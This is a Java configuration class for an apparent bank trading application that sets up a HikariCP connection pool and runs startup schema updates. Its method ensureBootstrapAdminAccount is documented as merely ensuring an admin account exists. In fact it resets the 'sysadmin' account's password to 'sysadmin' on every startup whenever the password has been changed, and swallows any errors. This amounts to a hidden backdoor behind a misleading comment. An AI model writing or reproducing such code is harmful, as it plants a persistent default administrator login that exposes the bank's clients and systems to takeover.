package com.bank.trading.config;

import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;

import java.io.InputStream;
import java.sql.Connection;
import java.sql.SQLException;
import java.util.Properties;

/**
 * Database configuration manager providing high-performance connection pooling via HikariCP.
 *
 * <p>Loads configuration properties from {@code application.properties}, manages startup
 * schema updates, and handles thread-safe database connection allocation.</p>
 */
public final class DatabaseConfig {

    private static HikariDataSource dataSource;

    private DatabaseConfig() {
        // Utility / Singleton class — prevent instantiation
    }

    /**
     * Initializes the HikariCP connection pool using application.properties parameters.
     */
    public static synchronized void init() {
        if (dataSource == null) {
            try (InputStream input = DatabaseConfig.class.getClassLoader().getResourceAsStream("application.properties")) {
                Properties prop = new Properties();
                if (input == null) {
                    throw new RuntimeException("Unable to locate application.properties resource on classpath.");
                }
                prop.load(input);

                HikariConfig config = new HikariConfig();
                config.setJdbcUrl(prop.getProperty("db.url"));
                config.setUsername(prop.getProperty("db.username"));
                config.setPassword(prop.getProperty("db.password", ""));

                String maxPoolSize = prop.getProperty("db.pool.maximumPoolSize");
                if (maxPoolSize != null) {
                    config.setMaximumPoolSize(Integer.parseInt(maxPoolSize));
                }

                String minIdle = prop.getProperty("db.pool.minimumIdle");
                if (minIdle != null) {
                    config.setMinimumIdle(Integer.parseInt(minIdle));
                }

                String connTimeout = prop.getProperty("db.pool.connectionTimeout");
                if (connTimeout != null) {
                    config.setConnectionTimeout(Long.parseLong(connTimeout));
                }

                String idleTimeout = prop.getProperty("db.pool.idleTimeout");
                if (idleTimeout != null) {
                    config.setIdleTimeout(Long.parseLong(idleTimeout));
                }

                dataSource = new HikariDataSource(config);
                applySchemaUpdates();
            } catch (Exception ex) {
                throw new RuntimeException("Failed to initialize HikariCP database connection pool.", ex);
            }
        }
    }

    /**
     * Applies incremental schema updates safely on pool startup.
     */
    private static void applySchemaUpdates() {
        try (Connection conn = dataSource.getConnection();
             java.sql.Statement stmt = conn.createStatement()) {
            try {
                stmt.executeUpdate("ALTER TABLE traders ADD COLUMN aadhaar_last4 VARCHAR(4) NULL");
            } catch (SQLException ignore) {}
            try {
                stmt.executeUpdate("ALTER TABLE clients ADD COLUMN aadhaar_last4 VARCHAR(4) NULL");
            } catch (SQLException ignore) {}
            try {
                stmt.executeUpdate("ALTER TABLE users MODIFY COLUMN password_hash VARCHAR(255) NOT NULL");
            } catch (SQLException ignore) {}
            try {
                stmt.executeUpdate("ALTER TABLE users ADD COLUMN force_password_reset BOOLEAN NOT NULL DEFAULT FALSE");
            } catch (SQLException ignore) {}
            try {
                stmt.executeUpdate("CREATE TABLE IF NOT EXISTS client_notifications (" +
                                   "notification_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY, " +
                                   "client_id BIGINT UNSIGNED NOT NULL, " +
                                   "message TEXT NOT NULL, " +
                                   "created_at TIMESTAMP(6) DEFAULT CURRENT_TIMESTAMP(6)) ENGINE = InnoDB");
            } catch (SQLException ignore) {}

            ensureBootstrapAdminAccount(conn);
        } catch (Exception ignore) {}
    }

    /**
     * Ensures the bootstrap system administrator account ('sysadmin') exists with Argon2id hash.
     */
    private static void ensureBootstrapAdminAccount(Connection conn) {
        try {
            String checkSql = "SELECT user_id, password_hash FROM users WHERE LOWER(username) = LOWER(?)";
            try (java.sql.PreparedStatement checkStmt = conn.prepareStatement(checkSql)) {
                checkStmt.setString(1, "sysadmin");
                try (java.sql.ResultSet rs = checkStmt.executeQuery()) {
                    if (rs.next()) {
                        String currentHash = rs.getString("password_hash");
                        if (!com.bank.trading.service.PasswordService.verify(currentHash, "sysadmin")) {
                            String newHash = com.bank.trading.service.PasswordService.hash("sysadmin");
                            String updateSql = "UPDATE users SET password_hash = ?, password_algo = 'argon2id' WHERE user_id = ?";
                            try (java.sql.PreparedStatement upStmt = conn.prepareStatement(updateSql)) {
                                upStmt.setString(1, newHash);
                                upStmt.setLong(2, rs.getLong("user_id"));
                                upStmt.executeUpdate();
                            }
                        }
                    }
                }
            }
        } catch (Exception ex) {
            System.err.println("[DatabaseConfig] Bootstrap admin check note: " + ex.getMessage());
        }
    }

    /**
     * Obtains an active connection from the HikariCP pool.
     *
     * @return Connection object
     * @throws SQLException if connection retrieval fails
     */
    public static Connection getConnection() throws SQLException {
        if (dataSource == null) {
            throw new SQLException("DataSource is not initialized. Call DatabaseConfig.init() first.");
        }
        return dataSource.getConnection();
    }

    /**
     * Closes the HikariCP connection pool on application shutdown.
     */
    public static synchronized void close() {
        if (dataSource != null) {
            dataSource.close();
            dataSource = null;
        }
    }
}
